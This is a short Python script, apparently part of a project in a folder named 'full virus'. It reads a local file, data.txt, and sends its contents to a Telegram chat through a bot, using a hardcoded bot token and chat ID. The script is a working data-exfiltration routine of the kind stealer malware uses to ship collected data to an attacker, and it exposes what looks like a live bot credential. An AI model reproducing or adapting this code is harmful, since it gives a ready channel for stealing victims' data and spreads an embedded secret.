import requests


bot_token = '6791408665:AAEDlPoAn_lwB3rMBNRjenRdEWIVgCSA7b4'

chat_id ='1653340086'
with open(r'c:\Users\yassi\Desktop\full virus\data.txt', 'r') as file:
    message = file.read()

url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"

r = requests.get(url)
print(r.json())
